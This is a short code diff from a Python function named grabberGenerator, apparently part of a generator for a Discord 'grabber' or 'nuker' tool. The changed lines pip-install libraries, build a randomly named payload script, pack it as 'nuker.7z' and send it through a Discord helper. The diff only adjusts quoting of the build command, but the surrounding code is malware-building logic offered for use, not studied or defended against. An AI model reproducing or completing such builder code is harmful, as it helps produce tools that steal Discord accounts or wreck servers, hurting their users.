@@ -104,7 +104,7 @@ def grabberGenerator():
                 f.write("\n".join(setupScript))
             
             subprocess.run("pip install "+" ".join(libraries), shell=True)
-            subprocess.run(f"{sys.executable} temp/{randomStr}-setup.py build", shell=True)
+            subprocess.run(f"\"{sys.executable}\" ./temp/{randomStr}-setup.py build", shell=True)
             with py7zr.SevenZipFile("nuker.7z", 'w', filters=[{'id': py7zr.FILTER_LZMA2, 'preset': 9}]) as archive:
                 archive.writeall("./temp/nuker/", arcname='')
             response = discord.sendFile("nuker.7z")
